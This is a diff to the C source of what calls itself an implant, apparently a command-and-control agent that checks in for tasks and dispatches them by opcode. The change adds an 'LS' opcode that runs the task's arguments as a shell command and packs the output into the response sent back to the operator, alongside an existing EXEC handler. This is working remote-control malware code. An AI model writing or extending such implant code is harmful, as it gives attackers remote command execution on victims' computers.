@@ -254,6 +254,29 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
 
     switch(*(tr->Opcode)) {
+        case OPCODE_LS: {
+            DEBUG_PRINTF("DOING LS\n"); 
+            size_t stOut = 0;
+            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
+            
+            // warning unsafe for any command that isn't a string
+            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
+            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
+            if (!bytes_array) {
+                free(cmdOut);
+                return 1;
+            }
+            
+            bytes_array->size = stOut;
+            memcpy(bytes_array->bytes, cmdOut, stOut);
+            free(cmdOut);
+            
+            tResp->TaskID = tr->TaskID;
+            tResp->Response = bytes_array;
+            
+            break; 
+        }
+
         case OPCODE_EXEC: {
             size_t stOut = 0;
             LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
@@ -303,7 +326,6 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
     }
     return 0;
 }
-
 
 int main() {
 	DEBUG_PRINTF("[+] Starting Implant.\n");
